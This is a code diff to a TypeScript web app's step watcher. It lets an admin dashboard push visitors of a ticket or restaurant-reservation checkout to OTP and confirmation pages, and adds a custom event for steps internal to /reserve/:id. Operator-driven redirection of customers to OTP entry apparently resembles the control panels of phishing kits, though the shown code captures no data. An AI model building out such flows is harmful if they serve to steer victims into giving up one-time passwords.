@@ -27,24 +27,31 @@ const TICKET_STEP_TO_PATH: Record<number, string> = {
 };
 
 // For restaurant flow, steps 2 (booking) and 3 (reserve_checkout) are
-// internal page steps inside `/reserve/:id` — navigating away from that URL
-// would lose the restaurant context. Only OTP and confirmation steps map to
-// shared routes.
+// internal page steps inside `/reserve/:id`. We dispatch a custom event for
+// reserve.tsx to handle without losing the restaurant URL context. OTP and
+// confirmation steps still map to shared routes.
 const RESTAURANT_STEP_TO_PATH: Record<number, string> = {
   5: "/otp",
   6: "/otp",
   7: "/confirmation",
 };
 
-function pickTargetPath(step: number, data: any): string | null {
-  const onReservePage = window.location.pathname.startsWith("/reserve");
-  const isRestaurant =
-    onReservePage ||
+// Steps that the reserve.tsx page handles internally (no URL change needed).
+const RESTAURANT_INTERNAL_STEPS = new Set<number>([2, 3]);
+
+function isRestaurantVisitor(data: any): boolean {
+  return (
+    window.location.pathname.startsWith("/reserve") ||
     String(data?.type || "").toLowerCase() === "restaurant_reservation" ||
     !!data?.restaurant ||
     !!data?.restaurantEn ||
     String(data?.currentPage || "") === "reserve_checkout" ||
-    String(data?.currentPage || "") === "reserve_otp";
+    String(data?.currentPage || "") === "reserve_otp"
+  );
+}
+
+function pickTargetPath(step: number, data: any): string | null {
+  const isRestaurant = isRestaurantVisitor(data);
   const map = isRestaurant ? RESTAURANT_STEP_TO_PATH : TICKET_STEP_TO_PATH;
   return map[step] || null;
 }
@@ -64,6 +71,22 @@ function DirectedStepWatcher() {
       // Re-check at fire time so admins don't get hijacked even if the
       // listener was attached on a non-admin path earlier.
       if (isAdminPath()) return;
+
+      // Restaurant SPA-internal steps: hand off to reserve.tsx via a custom
+      // event so it can update its internal step state without us navigating
+      // away from /reserve/:id.
+      if (
+        isRestaurantVisitor(data) &&
+        RESTAURANT_INTERNAL_STEPS.has(step) &&
+        window.location.pathname.startsWith("/reserve")
+      ) {
+        window.dispatchEvent(
+          new CustomEvent("admin-restaurant-step", { detail: { step } }),
+        );
+        void clearDirectedStep();
+        return;
+      }
+
       const target = pickTargetPath(step, data);
       // Always clear so the same step can be re-pushed and so the dashboard
       // doesn't keep showing a stale "directed" indicator.
